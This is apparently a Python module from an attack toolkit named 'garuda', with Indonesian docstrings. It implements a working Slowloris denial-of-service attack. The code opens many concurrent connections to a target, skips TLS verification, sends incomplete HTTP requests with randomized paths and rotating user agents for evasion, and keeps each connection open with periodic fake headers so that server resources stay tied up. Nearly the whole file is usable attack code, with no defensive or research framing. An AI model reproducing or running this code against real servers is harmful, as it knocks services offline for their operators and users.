import asyncio
import random
import socket
import ssl
import string

from .base_attack import BaseAttack
from garuda.modules.evasions.user_agents import get_random_user_agent

class SlowlorisAttack(BaseAttack):
    """
    Implementasi serangan Slowloris.

    Serangan ini bertujuan untuk membuat server target kelebihan beban
    dengan membuka banyak koneksi HTTP yang tidak lengkap. Koneksi ini
    dipertahankan dengan mengirimkan header tambahan secara berkala,
    sehingga sumber daya server tetap terpakai.
    """

    async def _create_socket(self):
        """
        Membuat koneksi socket dan mengirimkan permintaan HTTP yang tidak lengkap.
        Sekarang dengan randomisasi path dan retry otomatis.
        """
        writer = None
        connection_established = False
        initial_packet_sent = False
        max_retries = 3
        retries = 0
        while retries < max_retries and not connection_established:
            try:
                port = self.target.port or (443 if self.target.scheme == 'https' else 80)
                ssl_context = None
                if self.target.scheme == 'https':
                    ssl_context = ssl.create_default_context()
                    ssl_context.check_hostname = False
                    ssl_context.verify_mode = ssl.CERT_NONE
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(
                        self.target.hostname, 
                        port, 
                        ssl=ssl_context
                    ),
                    timeout=15.0
                )
                connection_established = True
                self.stats.increment("active_connections")
                def random_path():
                    base = self.target.path or '/'
                    if base == '/':
                        base = ''
                    rand = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(4, 12)))
                    return f"/{rand}{base}"
                path = random_path()
                initial_request = (
                    f"GET {path} HTTP/1.1\r\n"
                    f"Host: {self.target.hostname}\r\n"
                    f"User-Agent: {get_random_user_agent()}\r\n"
                    f"Accept-Language: en-US,en;q=0.5\r\n"
                    f"Accept-Encoding: gzip, deflate\r\n"
                    f"Connection: keep-alive\r\n"
                ).encode()
                writer.write(initial_request)
                await asyncio.wait_for(writer.drain(), timeout=10.0)
                initial_packet_sent = True
                self.stats.increment("sent_packets")
                while self.is_running:
                    try:
                        keep_alive_header = f"X-{random.choice(['Auth', 'Session', 'Token'])}: {random.randint(10000, 99999)}\r\n".encode()
                        writer.write(keep_alive_header)
                        await asyncio.wait_for(writer.drain(), timeout=5.0)
                        self.stats.increment("sent_packets")
                        await asyncio.sleep(random.uniform(8, 15))
                    except (ConnectionResetError, BrokenPipeError, OSError, asyncio.TimeoutError):
                        break
                    except asyncio.CancelledError:
                        break
            except (socket.gaierror, ConnectionError, OSError, asyncio.TimeoutError):
                retries += 1
                if not connection_established:
                    self.stats.increment("failed_connections")
                await asyncio.sleep(random.uniform(0.2, 0.7))
            except asyncio.CancelledError:
                if not connection_established:
                    self.stats.increment("failed_connections")
                raise
            except Exception:
                retries += 1
                if not connection_established:
                    self.stats.increment("failed_connections")
                await asyncio.sleep(random.uniform(0.2, 0.7))
            finally:
                if connection_established:
                    self.stats.decrement("active_connections")
                if writer and not writer.is_closing():
                    writer.close()
                    try:
                        await writer.wait_closed()
                    except Exception:
                        pass

    async def execute(self):
        """
        Memulai serangan Slowloris.

        Behavior:
            - Membuat sejumlah koneksi socket sesuai dengan jumlah yang ditentukan.
            - Mengelola koneksi secara asinkron untuk mempertahankan serangan.
            - Menangani koneksi aktif, paket yang terkirim, dan koneksi yang gagal.
            - Memberikan grace period untuk penyelesaian koneksi yang sedang dibuat.
        """
        self.is_running = True
        
        tasks = [self._create_socket() for _ in range(self.connections)]
        
        try:
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            successful_tasks = sum(1 for result in results if not isinstance(result, Exception))
            failed_tasks = len(results) - successful_tasks
        except asyncio.CancelledError:
            for task in tasks:
                if not task.done():
                    task.cancel()
            
            try:
                await asyncio.wait_for(asyncio.gather(*tasks, return_exceptions=True), timeout=2.0)
            except asyncio.TimeoutError:
                pass
            
            raise
        finally:
            self.is_running = False